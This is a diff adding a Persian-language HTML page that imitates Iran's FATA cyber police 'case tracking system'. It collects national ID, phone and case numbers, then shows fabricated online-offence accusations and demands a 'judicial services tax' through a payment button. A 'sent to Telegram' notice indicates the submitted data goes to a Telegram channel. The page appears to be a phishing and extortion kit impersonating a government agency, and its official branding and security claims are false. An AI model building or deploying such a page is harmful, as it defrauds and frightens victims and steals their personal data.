@@ -1,0 +1,1626 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>سامانه یکپارچه پیگیری شکایات سایبری | پلیس فتا</title>
+    <link rel="icon" type="image/x-icon" href="https://img.icons8.com/color/96/000000/police-badge.png">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/vazirmatn@33.003/font.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --cyber-blue: #0a2e5c;
+            --police-blue: #1a3b7a;
+            --cyber-red: #d32f2f;
+            --cyber-gold: #ffb300;
+            --cyber-gray: #2c3e50;
+            --light-gray: #f5f7fa;
+        }
+        
+        * {
+            font-family: 'Vazirmatn', sans-serif;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #0a2e5c 0%, #1a3b7a 100%);
+            min-height: 100vh;
+            color: #333;
+            position: relative;
+            overflow-x: hidden;
+            font-size: 14px;
+        }
+        
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(circle at 20% 30%, rgba(255, 179, 0, 0.03) 0%, transparent 50%),
+                radial-gradient(circle at 80% 70%, rgba(211, 47, 47, 0.03) 0%, transparent 50%);
+            z-index: -1;
+        }
+        
+        .main-header {
+            background: linear-gradient(90deg, var(--cyber-blue) 0%, var(--police-blue) 100%);
+            border-bottom: 4px solid var(--cyber-gold);
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+            position: relative;
+            overflow: hidden;
+            padding: 10px 0;
+        }
+        
+        .header-pattern {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                repeating-linear-gradient(45deg, transparent, transparent 10px, rgba(255, 179, 0, 0.05) 10px, rgba(255, 179, 0, 0.05) 20px);
+            opacity: 0.3;
+        }
+        
+        .iran-flag {
+            height: 15px;
+            width: 100%;
+            background: linear-gradient(to bottom, #239F40 33%, #FFFFFF 33%, #FFFFFF 66%, #DA0000 66%);
+            margin-bottom: 8px;
+            border-radius: 2px;
+        }
+        
+        .logo-container {
+            position: relative;
+            padding: 10px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            backdrop-filter: blur(5px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            display: inline-block;
+        }
+        
+        .shield-logo {
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, var(--cyber-blue), var(--police-blue));
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 28px;
+            box-shadow: 0 0 15px rgba(255, 179, 0, 0.5);
+            position: relative;
+            border: 3px solid var(--cyber-gold);
+        }
+        
+        .form-wrapper {
+            background: rgba(255, 255, 255, 0.98);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            box-shadow: 
+                0 10px 25px rgba(0, 0, 0, 0.2),
+                inset 0 1px 0 rgba(255, 255, 255, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.4);
+            overflow: hidden;
+            position: relative;
+            margin: 30px auto;
+            max-width: 100%;
+            width: 95%;
+        }
+        
+        @media (min-width: 768px) {
+            .form-wrapper {
+                width: 90%;
+                max-width: 850px;
+            }
+        }
+        
+        @media (min-width: 992px) {
+            .form-wrapper {
+                width: 85%;
+                max-width: 900px;
+            }
+        }
+        
+        .form-wrapper::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, var(--cyber-gold), var(--cyber-red), var(--cyber-blue));
+        }
+        
+        .security-badge {
+            position: absolute;
+            top: 15px;
+            left: 15px;
+            background: var(--cyber-red);
+            color: white;
+            padding: 6px 12px;
+            border-radius: 5px;
+            font-size: 11px;
+            font-weight: bold;
+            transform: rotate(-5deg);
+            box-shadow: 0 3px 8px rgba(211, 47, 47, 0.3);
+            z-index: 10;
+        }
+        
+        .form-header {
+            background: linear-gradient(90deg, var(--police-blue), var(--cyber-blue));
+            color: white;
+            padding: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .form-header::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: linear-gradient(90deg, var(--cyber-gold), transparent);
+        }
+        
+        .form-section {
+            padding: 25px 20px;
+        }
+        
+        @media (min-width: 768px) {
+            .form-section {
+                padding: 30px;
+            }
+        }
+        
+        .input-group-custom {
+            position: relative;
+            margin-bottom: 20px;
+        }
+        
+        .input-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 700;
+            color: var(--cyber-blue);
+            font-size: 14px;
+            position: relative;
+            padding-right: 20px;
+        }
+        
+        .input-label::before {
+            content: '*';
+            position: absolute;
+            right: 5px;
+            top: 0;
+            color: var(--cyber-red);
+            font-size: 16px;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 14px;
+            transition: all 0.3s;
+            background: white;
+            box-shadow: inset 0 2px 4px rgba(0,0,0,0.05);
+        }
+        
+        .form-input:focus {
+            border-color: var(--police-blue);
+            box-shadow: 0 0 0 3px rgba(26, 59, 122, 0.2);
+            outline: none;
+        }
+        
+        .form-input.error {
+            border-color: var(--cyber-red);
+            background: rgba(211, 47, 47, 0.05);
+        }
+        
+        .captcha-box {
+            background: linear-gradient(135deg, #f8f9fa, #e9ecef);
+            border-radius: 8px;
+            padding: 20px;
+            border: 2px dashed #adb5bd;
+            position: relative;
+            margin: 25px 0;
+        }
+        
+        .captcha-code {
+            font-family: 'Courier New', monospace;
+            font-size: 28px;
+            font-weight: 900;
+            letter-spacing: 6px;
+            text-align: center;
+            padding: 12px;
+            margin: 12px 0;
+            background: linear-gradient(45deg, var(--cyber-gray), var(--police-blue));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            position: relative;
+            user-select: none;
+            text-shadow: 2px 2px 3px rgba(0,0,0,0.1);
+        }
+        
+        @media (max-width: 576px) {
+            .captcha-code {
+                font-size: 24px;
+                letter-spacing: 4px;
+            }
+        }
+        
+        .captcha-code::after {
+            content: '';
+            position: absolute;
+            width: 100%;
+            height: 2px;
+            bottom: 0;
+            left: 0;
+            background: linear-gradient(90deg, transparent, var(--cyber-gold), transparent);
+        }
+        
+        .submit-btn {
+            background: linear-gradient(90deg, var(--police-blue), var(--cyber-blue));
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 16px;
+            font-weight: 700;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+            width: 100%;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 5px 15px rgba(10, 46, 92, 0.3);
+            margin-top: 15px;
+        }
+        
+        .submit-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(10, 46, 92, 0.4);
+            background: linear-gradient(90deg, var(--cyber-blue), var(--police-blue));
+        }
+        
+        .submit-btn:active {
+            transform: translateY(0);
+        }
+        
+        .submit-btn.loading {
+            pointer-events: none;
+            opacity: 0.8;
+        }
+        
+        .payment-panel {
+            background: linear-gradient(135deg, #fff8e1, #ffecb3);
+            border-radius: 12px;
+            padding: 25px;
+            margin: 20px 0;
+            border: 3px solid var(--cyber-gold);
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        @media (min-width: 768px) {
+            .payment-panel {
+                padding: 30px;
+            }
+        }
+        
+        .payment-panel::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255, 179, 0, 0.1) 0%, transparent 70%);
+        }
+        
+        .payment-icon {
+            font-size: 60px;
+            color: var(--cyber-gold);
+            margin-bottom: 15px;
+            animation: pulse 2s infinite;
+        }
+        
+        .payment-amount {
+            font-size: 36px;
+            font-weight: 900;
+            color: var(--cyber-red);
+            margin: 15px 0;
+            text-shadow: 2px 2px 0 rgba(0,0,0,0.1);
+        }
+        
+        @media (max-width: 576px) {
+            .payment-icon {
+                font-size: 50px;
+            }
+            
+            .payment-amount {
+                font-size: 32px;
+            }
+        }
+        
+        .payment-btn {
+            background: linear-gradient(90deg, #4CAF50, #2E7D32);
+            color: white;
+            border: none;
+            padding: 16px 35px;
+            font-size: 16px;
+            font-weight: 700;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 15px;
+            box-shadow: 0 8px 20px rgba(76, 175, 80, 0.3);
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            text-decoration: none;
+        }
+        
+        .payment-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(76, 175, 80, 0.4);
+            background: linear-gradient(90deg, #2E7D32, #4CAF50);
+            color: white;
+        }
+        
+        @media (max-width: 576px) {
+            .payment-btn {
+                width: 100%;
+                padding: 14px 25px;
+            }
+        }
+        
+        .payment-note {
+            background: rgba(255, 255, 255, 0.9);
+            border-radius: 8px;
+            padding: 12px;
+            margin-top: 20px;
+            border-right: 4px solid var(--cyber-blue);
+            font-size: 13px;
+        }
+        
+        .result-panel {
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 20px;
+            margin-top: 20px;
+            border-right: 5px solid var(--police-blue);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+        }
+        
+        @media (min-width: 768px) {
+            .result-panel {
+                padding: 25px;
+            }
+        }
+        
+        .case-status-badge {
+            display: inline-block;
+            padding: 6px 15px;
+            border-radius: 20px;
+            font-weight: 700;
+            font-size: 13px;
+            margin-bottom: 15px;
+        }
+        
+        .case-status-badge.investigation {
+            background: #fff3cd;
+            color: #856404;
+            border: 1px solid #ffeaa7;
+        }
+        
+        .case-status-badge.payment {
+            background: #d1ecf1;
+            color: #0c5460;
+            border: 1px solid #bee5eb;
+        }
+        
+        .cyber-footer {
+            background: rgba(10, 46, 92, 0.95);
+            color: white;
+            padding: 20px 0;
+            margin-top: 30px;
+            border-top: 3px solid var(--cyber-gold);
+            backdrop-filter: blur(10px);
+            font-size: 13px;
+        }
+        
+        .security-tips {
+            background: rgba(255, 179, 0, 0.1);
+            border-right: 4px solid var(--cyber-gold);
+            padding: 15px;
+            border-radius: 8px;
+            margin: 20px 0;
+            font-size: 13px;
+        }
+        
+        .loading-container {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .loading-spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid var(--police-blue);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.03); }
+            100% { transform: scale(1); }
+        }
+        
+        .error-message {
+            display: none;
+            background: rgba(211, 47, 47, 0.1);
+            border-right: 4px solid var(--cyber-red);
+            color: var(--cyber-red);
+            padding: 12px;
+            border-radius: 6px;
+            margin: 12px 0;
+            font-size: 13px;
+        }
+        
+        .status-bar {
+            background: var(--cyber-gray);
+            color: white;
+            padding: 8px 15px;
+            font-size: 11px;
+            display: flex;
+            justify-content: space-between;
+            border-top: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        .result-page {
+            display: none;
+            padding: 15px;
+        }
+        
+        .result-header {
+            background: linear-gradient(90deg, var(--police-blue), var(--cyber-blue));
+            color: white;
+            padding: 20px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .result-header::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: linear-gradient(90deg, var(--cyber-gold), transparent);
+        }
+        
+        .telegram-success {
+            background: rgba(0, 136, 204, 0.1);
+            border-right: 4px solid #0088cc;
+            padding: 12px;
+            border-radius: 6px;
+            margin: 12px 0;
+            animation: pulse 2s infinite;
+            font-size: 13px;
+        }
+        
+        .captcha-btn {
+            transition: all 0.3s;
+            font-size: 13px;
+        }
+        
+        .captcha-btn:hover {
+            transform: translateY(-2px);
+        }
+        
+        .captcha-btn:active {
+            transform: translateY(0);
+        }
+        
+        .btn-back {
+            background: linear-gradient(90deg, var(--cyber-gray), var(--police-blue));
+            color: white;
+            border: none;
+            padding: 10px 25px;
+            border-radius: 6px;
+            margin-top: 15px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        .btn-back:hover {
+            background: linear-gradient(90deg, var(--police-blue), var(--cyber-gray));
+            color: white;
+            transform: translateY(-2px);
+        }
+        
+        .violation-badge {
+            background: linear-gradient(90deg, #d32f2f, #b71c1c);
+            color: white;
+            padding: 8px 15px;
+            border-radius: 8px;
+            font-weight: 700;
+            display: inline-block;
+            margin: 8px 0;
+            font-size: 13px;
+        }
+        
+        .violation-details {
+            background: rgba(211, 47, 47, 0.1);
+            border-right: 4px solid var(--cyber-red);
+            padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+            font-size: 13px;
+        }
+        
+        .countdown-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            z-index: 9999;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            color: white;
+        }
+        
+        .countdown-number {
+            font-size: 120px;
+            font-weight: bold;
+            color: #ffb300;
+            animation: countdownPulse 1s infinite;
+        }
+        
+        @keyframes countdownPulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        
+        .countdown-message {
+            font-size: 24px;
+            margin-top: 20px;
+            text-align: center;
+        }
+        
+        .countdown-submessage {
+            font-size: 16px;
+            margin-top: 10px;
+            opacity: 0.8;
+        }
+        
+        @media (max-width: 576px) {
+            .countdown-number {
+                font-size: 80px;
+            }
+            
+            .countdown-message {
+                font-size: 18px;
+            }
+            
+            .countdown-submessage {
+                font-size: 14px;
+            }
+        }
+        
+        .success-message {
+            display: none;
+            background: rgba(76, 175, 80, 0.1);
+            border-right: 4px solid #4CAF50;
+            color: #2E7D32;
+            padding: 12px;
+            border-radius: 6px;
+            margin: 12px 0;
+            font-size: 13px;
+        }
+        
+        .payment-page {
+            display: none;
+            padding: 15px;
+        }
+        
+        .payment-status {
+            background: linear-gradient(135deg, #e3f2fd, #bbdefb);
+            border-radius: 12px;
+            padding: 25px;
+            margin: 20px 0;
+            border: 3px solid #2196f3;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .payment-status-icon {
+            font-size: 70px;
+            color: #2196f3;
+            margin-bottom: 20px;
+        }
+        
+        .payment-redirect-btn {
+            background: linear-gradient(90deg, #2196f3, #1976d2);
+            color: white;
+            border: none;
+            padding: 18px 40px;
+            font-size: 18px;
+            font-weight: 700;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 25px;
+            box-shadow: 0 8px 20px rgba(33, 150, 243, 0.3);
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+        
+        .payment-redirect-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(33, 150, 243, 0.4);
+            background: linear-gradient(90deg, #1976d2, #2196f3);
+        }
+        
+        .timeline {
+            position: relative;
+            padding-right: 25px;
+            margin-top: 15px;
+        }
+        
+        .timeline::before {
+            content: '';
+            position: absolute;
+            right: 12px;
+            top: 0;
+            bottom: 0;
+            width: 3px;
+            background: linear-gradient(to bottom, var(--cyber-blue), var(--cyber-gold));
+        }
+        
+        .timeline-item {
+            position: relative;
+            margin-bottom: 20px;
+            padding-right: 35px;
+            font-size: 13px;
+        }
+        
+        .timeline-item::before {
+            content: '';
+            position: absolute;
+            right: 5px;
+            top: 5px;
+            width: 16px;
+            height: 16px;
+            background: var(--cyber-blue);
+            border-radius: 50%;
+            border: 2px solid white;
+            box-shadow: 0 0 0 2px var(--cyber-gold);
+        }
+    </style>
+</head>
+<body>
+    <div id="mainPage">
+        <div class="status-bar">
+            <div>
+                <i class="fas fa-shield-alt me-2"></i>
+                <span>سامانه امن پیگیری شکایات سایبری - نسخه ۲.۴.۲</span>
+            </div>
+            <div>
+                <i class="fas fa-clock me-2"></i>
+                <span id="current-date">در حال بارگذاری تاریخ...</span>
+            </div>
+        </div>
+
+        <header class="main-header">
+            <div class="header-pattern"></div>
+            <div class="container py-2">
+                <div class="iran-flag"></div>
+                <div class="row align-items-center">
+                    <div class="col-md-2 text-center">
+                        <div class="logo-container">
+                            <div class="shield-logo">
+                                <i class="fas fa-shield-alt"></i>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-10">
+                        <h1 class="mb-2" style="color: white; font-weight: 900;">
+                            <i class="fas fa-user-shield me-3"></i>
+                            پلیس فضای تولید و تبادل اطلاعات (فتا)
+                        </h1>
+                        <h3 class="mb-0" style="color: #ffb300; font-weight: 700;">
+                            سامانه یکپارچه پیگیری شکایات و پرونده‌های سایبری
+                        </h3>
+                        <p class="mt-2 mb-0" style="color: rgba(255,255,255,0.9); font-size: 13px;">
+                            Cyber Police Tracking System - CPTS
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </header>
+
+        <div class="container">
+            <div class="form-wrapper">
+                <div class="security-badge">
+                    <i class="fas fa-lock me-1"></i> ارتباط امن SSL 256-bit
+                </div>
+                
+                <div class="form-header">
+                    <h2 class="mb-3">
+                        <i class="fas fa-search me-3"></i>
+                        استعلام وضعیت پرونده/شکایت
+                    </h2>
+                    <p class="mb-0" style="opacity: 0.9; font-size: 13px;">
+                        جهت استعلام وضعیت پرونده یا شکایت ثبت شده در پلیس فتا، اطلاعات زیر را وارد نمایید.
+                    </p>
+                </div>
+                
+                <div class="form-section">
+                    <div class="error-message" id="formError">
+                        <i class="fas fa-exclamation-circle me-2"></i>
+                        <span id="errorText"></span>
+                    </div>
+                    
+                    <div class="success-message" id="successMessage">
+                        <i class="fas fa-check-circle me-2"></i>
+                        <span id="successText"></span>
+                    </div>
+                    
+                    <div class="alert alert-warning border-right-4 border-warning" role="alert" style="font-size: 13px;">
+                        <i class="fas fa-exclamation-triangle me-2"></i>
+                        <strong>توجه:</strong> این سامانه فقط برای پرونده‌های ثبت شده در ۱۲ ماه گذشته فعال می‌باشد.
+                    </div>
+                    
+                    <form id="cyberForm" novalidate>
+                        <div class="row">
+                            <div class="col-md-4">
+                                <div class="input-group-custom">
+                                    <label class="input-label">
+                                        <i class="fas fa-id-card me-2"></i>
+                                        کد ملی شاکی
+                                    </label>
+                                    <input type="text" 
+                                           class="form-input" 
+                                           id="nationalCode"
+                                           name="nationalCode"
+                                           maxlength="10"
+                                           placeholder="مثال: ۰۹۸۷۶۵۴۳۲۱"
+                                           required
+                                           pattern="\d{10}">
+                                    <div class="form-text text-muted mt-2" style="font-size: 12px;">
+                                        <i class="fas fa-info-circle me-1"></i>
+                                        کد ملی ۱۰ رقمی بدون خط تیره
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <div class="col-md-4">
+                                <div class="input-group-custom">
+                                    <label class="input-label">
+                                        <i class="fas fa-phone me-2"></i>
+                                        شماره تماس
+                                    </label>
+                                    <input type="tel" 
+                                           class="form-input" 
+                                           id="phoneNumber"
+                                           name="phoneNumber"
+                                           placeholder="مثال: ۰۹۱۲۳۴۵۶۷۸۹"
+                                           required
+                                           pattern="09\d{9}">
+                                    <div class="form-text text-muted mt-2" style="font-size: 12px;">
+                                        <i class="fas fa-info-circle me-1"></i>
+                                        شماره همراه ۱۱ رقمی (با ۰۹ شروع شود)
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <div class="col-md-4">
+                                <div class="input-group-custom">
+                                    <label class="input-label">
+                                        <i class="fas fa-file-contract me-2"></i>
+                                        شماره پیگیری/پرونده
+                                    </label>
+                                    <input type="text" 
+                                           class="form-input" 
+                                           id="caseNumber"
+                                           name="caseNumber"
+                                           placeholder="مثال: CPTS-۱۴۰۲-۱۲۳۴۵۶۷"
+                                           required
+                                           minlength="5">
+                                    <div class="form-text text-muted mt-2" style="font-size: 12px;">
+                                        <i class="fas fa-info-circle me-1"></i>
+                                        شماره مندرج در رسید ثبت شکایت
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="captcha-box">
+                            <label class="input-label mb-3">
+                                <i class="fas fa-robot me-2"></i>
+                                تایید هویت امنیتی (کپچا)
+                            </label>
+                            
+                            <div class="row align-items-center">
+                                <div class="col-md-8">
+                                    <div class="captcha-code" id="captchaText">8G9H2K</div>
+                                </div>
+                                <div class="col-md-4">
+                                    <div class="d-flex flex-column gap-2">
+                                        <button type="button" class="btn btn-outline-secondary captcha-btn" id="refreshCaptcha">
+                                            <i class="fas fa-sync-alt me-2"></i>
+                                            کد جدید
+                                        </button>
+                                        <button type="button" class="btn btn-outline-secondary captcha-btn" id="audioCaptcha">
+                                            <i class="fas fa-volume-up me-2"></i>
+                                            صوتی
+                                        </button>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <div class="mt-4">
+                                <input type="text" 
+                                       class="form-input" 
+                                       id="captchaInput"
+                                       name="captcha"
+                                       placeholder="کد امنیتی بالا را وارد نمایید"
+                                       required
+                                       maxlength="6">
+                            </div>
+                        </div>
+                        
+                        <div class="loading-container" id="loadingContainer">
+                            <div class="loading-spinner"></div>
+                            <p class="mt-3 text-muted" style="font-size: 13px;">
+                                <i class="fas fa-database me-2"></i>
+                                در حال جستجو در پایگاه داده مرکزی پلیس فتا...
+                            </p>
+                        </div>
+                        
+                        <button type="submit" class="submit-btn" id="submitBtn">
+                            <i class="fas fa-search me-2"></i>
+                            استعلام وضعیت پرونده
+                        </button>
+                    </form>
+                </div>
+            </div>
+            
+            <div class="security-tips">
+                <div class="row">
+                    <div class="col-md-4">
+                        <div class="text-center p-2">
+                            <div class="display-4 text-primary mb-2" style="font-size: 2.5rem;">
+                                <i class="fas fa-user-shield"></i>
+                            </div>
+                            <h6 style="font-size: 14px;">محرمانگی اطلاعات</h6>
+                            <p class="small" style="font-size: 12px;">اطلاعات شما با استانداردهای امنیتی رمزنگاری شده است.</p>
+                        </div>
+                    </div>
+                    <div class="col-md-4">
+                        <div class="text-center p-2">
+                            <div class="display-4 text-warning mb-2" style="font-size: 2.5rem;">
+                                <i class="fas fa-clock"></i>
+                            </div>
+                            <h6 style="font-size: 14px;">پاسخگویی ۲۴ ساعته</h6>
+                            <p class="small" style="font-size: 12px;">سامانه به صورت ۲۴ ساعته و ۷ روز هفته فعال است.</p>
+                        </div>
+                    </div>
+                    <div class="col-md-4">
+                        <div class="text-center p-2">
+                            <div class="display-4 text-danger mb-2" style="font-size: 2.5rem;">
+                                <i class="fas fa-balance-scale"></i>
+                            </div>
+                            <h6 style="font-size: 14px;">پیگیری قانونی</h6>
+                            <p class="small" style="font-size: 12px;">تمام پرونده‌ها تا حصول نتیجه نهایی پیگیری می‌شوند.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <footer class="cyber-footer">
+            <div class="container">
+                <div class="row">
+                    <div class="col-md-6">
+                        <h5 class="mb-3" style="color: #ffb300; font-size: 14px;">
+                            <i class="fas fa-map-marker-alt me-2"></i>
+                            دفتر مرکزی
+                        </h5>
+                        <p class="small">تهران، میدان ولیعصر، بلوار کشاورز، پلیس فتا</p>
+                        <p class="small">
+                            <i class="fas fa-phone me-2"></i>
+                            تلفن: ۰۲۱-۲۴۶۵۴
+                        </p>
+                        <p class="small">
+                            <i class="fas fa-envelope me-2"></i>
+                            ایمیل: info@cyberpolice.ir
+                        </p>
+                    </div>
+                    <div class="col-md-6">
+                        <h5 class="mb-3" style="color: #ffb300; font-size: 14px;">
+                            <i class="fas fa-exclamation-triangle me-2"></i>
+                            هشدار
+                        </h5>
+                        <p class="small">لطفاً از وارد کردن اطلاعات پرونده در سایت‌های غیررسمی خودداری کنید.</p>
+                        <p class="small">سامانه رسمی پلیس فتا تنها از طریق آدرس‌های معتبر قابل دسترسی است.</p>
+                    </div>
+                </div>
+                <hr style="border-color: rgba(255,255,255,0.1);">
+                <div class="text-center">
+                    <p class="mb-0 small">
+                        کلیه حقوق این سامانه متعلق به پلیس فضای تولید و تبادل اطلاعات (فتا) می‌باشد. © ۱۴۰۲
+                    </p>
+                    <p class="small mt-2">
+                        <span id="visitorCount">در حال بارگذاری...</span> بازدید امروز
+                    </p>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <div id="resultPage" class="result-page">
+        <div class="container">
+            <div class="form-wrapper">
+                <div class="form-header">
+                    <h2 class="mb-3">
+                        <i class="fas fa-file-alt me-3"></i>
+                        نتایج استعلام پرونده
+                    </h2>
+                    <p class="mb-0" style="opacity: 0.9; font-size: 13px;">
+                        اطلاعات پرونده شما با موفقیت دریافت و پردازش شد.
+                    </p>
+                </div>
+                
+                <div class="form-section">
+                    <div class="telegram-success" id="telegramSuccess">
+                        <i class="fab fa-telegram me-2"></i>
+                        <strong id="telegramTitle">اطلاعات پرونده با موفقیت به تلگرام ارسال شد!</strong>
+                        <span id="telegramDetails" class="d-block mt-1" style="font-size: 12px;"></span>
+                    </div>
+                    
+                    <div class="result-panel">
+                        <div class="d-flex justify-content-between align-items-center mb-4">
+                            <h4 class="mb-0">
+                                <i class="fas fa-file-invoice me-3"></i>
+                                اطلاعات پرونده
+                            </h4>
+                            <span class="case-status-badge payment">
+                                <i class="fas fa-money-bill-wave me-2"></i>
+                                نیازمند پرداخت مالیات
+                            </span>
+                        </div>
+                        
+                        <div class="violation-details mb-4">
+                            <div class="violation-badge">
+                                <i class="fas fa-exclamation-triangle me-2"></i>
+                                تخلفات شناسایی شده
+                            </div>
+                            <div class="mt-3">
+                                <h6>نوع تخلف: <strong>تخلف در فضای مجازی</strong></h6>
+                                <p class="mb-2">• انتشار محتوای نامناسب و توهین‌آمیز</p>
+                                <p class="mb-2">• فحاشی و استفاده از الفاظ رکیک در فضای مجازی</p>
+                                <p class="mb-2">• انتشار تصاویر و مطالب خلاف عفت عمومی</p>
+                                <p class="mb-2">• ایجاد مزاحمت برای کاربران دیگر</p>
+                            </div>
+                        </div>
+                        
+                        <div class="row mb-4">
+                            <div class="col-md-6">
+                                <p><strong>شماره پرونده:</strong> <span id="resCaseNumber" class="font-monospace">CPTS-FTA-۱۴۰۲-۳۸۴۷</span></p>
+                                <p><strong>کد ملی شاکی:</strong> <span id="resNationalCode">---</span></p>
+                                <p><strong>شماره تماس:</strong> <span id="resPhoneNumber">---</span></p>
+                                <p><strong>تاریخ ثبت:</strong> <span id="resRegisterDate">۱۴۰۲/۰۷/۱۵ - ۱۰:۴۵</span></p>
+                            </div>
+                            <div class="col-md-6">
+                                <p><strong>واحد رسیدگی‌کننده:</strong> <span id="resDepartment">واحد جرایم اخلاقی و محتوای مجازی</span></p>
+                                <p><strong>کارشناس پرونده:</strong> <span id="resOfficer">سروان کریمی</span></p>
+                                <p><strong>آخرین به‌روزرسانی:</strong> <span id="resLastUpdate">۱۴۰۲/۰۷/۲۰ - ۱۴:۳۰</span></p>
+                                <p><strong>وضعیت پرداخت:</strong> <span class="text-danger fw-bold">پرداخت نشده</span></p>
+                            </div>
+                        </div>
+                        
+                        <div class="payment-panel">
+                            <div class="payment-icon">
+                                <i class="fas fa-file-invoice-dollar"></i>
+                            </div>
+                            
+                            <h4 class="text-danger">
+                                <i class="fas fa-exclamation-circle me-2"></i>
+                                دسترسی محدود شده
+                            </h4>
+                            
+                            <p class="lead" style="font-size: 14px;">
+                                جهت مشاهده کامل جزئیات پرونده، مستندات، و سیر قانونی پرونده، 
+                                می‌بایست مالیات خدمات قضایی به مبلغ زیر پرداخت نمایید.
+                            </p>
+                            
+                            <div class="payment-amount">
+                                ۱۰,۰۰۰ تومان
+                            </div>
+                            
+                            <p class="text-muted" style="font-size: 13px;">
+                                این مبلغ به عنوان مالیات خدمات قضایی و اداری دریافت می‌گردد.
+                            </p>
+                            
+                            <button type="button" class="payment-btn" id="paymentButton">
+                                <i class="fas fa-lock me-2"></i>
+                                ورود به درگاه پرداخت امن
+                            </button>
+                            
+                            <div class="payment-note">
+                                <i class="fas fa-info-circle me-2 text-primary"></i>
+                                پس از پرداخت موفق، دسترسی کامل به پرونده شامل جزئیات، مستندات، تاریخچه و پیگیری‌های قضایی برای شما فعال خواهد شد.
+                            </div>
+                        </div>
+                        
+                        <h5 class="mb-4 mt-5">
+                            <i class="fas fa-history me-2"></i>
+                            سیر زمانی پرونده (محدود)
+                        </h5>
+                        <div class="timeline">
+                            <div class="timeline-item">
+                                <strong>۱۴۰۲/۰۷/۱۵ - ۱۰:۴۵</strong>
+                                <p class="mb-0">ثبت شکایت اولیه در سامانه</p>
+                            </div>
+                            <div class="timeline-item">
+                                <strong>۱۴۰۲/۰۷/۱۶ - ۱۱:۲۰</strong>
+                                <p class="mb-0">ارجاع به واحد تخصصی جرایم اخلاقی</p>
+                            </div>
+                            <div class="timeline-item">
+                                <strong>۱۴۰۲/۰۷/۱۸ - ۰۹:۱۵</strong>
+                                <p class="mb-0">جمع‌آوری مدارک و مستندات اولیه</p>
+                            </div>
+                            <div class="timeline-item">
+                                <strong>۱۴۰۲/۰۷/۲۰ - ۱۴:۳۰</strong>
